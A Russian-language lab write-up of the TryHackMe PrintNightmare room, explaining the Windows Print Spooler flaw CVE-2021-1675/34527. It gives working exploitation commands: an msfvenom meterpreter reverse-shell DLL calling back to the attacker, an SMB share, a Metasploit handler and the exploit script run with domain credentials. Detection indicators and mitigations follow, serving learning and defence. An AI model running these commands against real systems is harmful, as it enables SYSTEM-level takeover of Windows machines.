# PrintNightmare: выполнение DLL от SYSTEM

**Машина:** [PrintNightmare](https://tryhackme.com/room/printnightmarehpzqlp8) (medium, Windows)
**Суть:** CVE-2021-1675 / CVE-2021-34527 — уязвимости Windows Print Spooler. В этом сценарии рассматривается удалённая загрузка DLL от SYSTEM; применимость зависит от версии системы, обновлений и политик.

## Почему это работает

Print Spooler работает от SYSTEM. Возможность атаки зависит от того, запущена ли служба, доступен ли RPC-интерфейс и какие обновления и политики установлены. Уязвимость в `RpcAddPrinterDriverEx`: аутентифицированный юзер может подсунуть драйвер из произвольного пути — например, из SMB-шары атакующего. Спулер грузит нашу DLL от SYSTEM.

## Эксплуатация

Готовим DLL с реверс-шеллом и шару:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o share/malicious.dll
smbserver.py share $(pwd)/share -smb2support
# handler в metasploit: use exploit/multi/handler; run -j
```

Проверка наличия интерфейсов MS-RPRN / MS-PAR — это ещё не подтверждение уязвимости:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Эксплойт — от уже скомпрометированного доменного юзера (это post-compromise):

```bash
python3 CVE-2021-1675.py DOMAIN/user:pass@TARGET '\\IP\share\malicious.dll'
```

Ошибки после «Try 3» сами по себе не подтверждают ни успех, ни неудачу. Результат нужно проверять по загрузке DLL и появлению сессии в Metasploit.

## Детект и митигейшн

IoC: `spoolsv.exe` порождает `rundll32.exe` без аргументов, чужие DLL в `system32\spool\drivers\x64\3\`, в Wireshark — вызовы `RpcAddPrinterDriver(Ex)` по DCE/RPC (ложных срабатываний от легитимной печати хватает). Основная мера — установка обновлений и проверка политик установки драйверов. Если печать не нужна, Spooler стоит отключить, особенно на DC. Отключение GPO «Allow Print Spooler to accept client connections» ограничивает удалённые подключения, но не заменяет исправления и не закрывает все локальные пути.

## Заметка

В описанном сценарии нужны действующие учётные данные. Они не обязательно получены фишингом: способ первоначального доступа здесь не рассматривается.
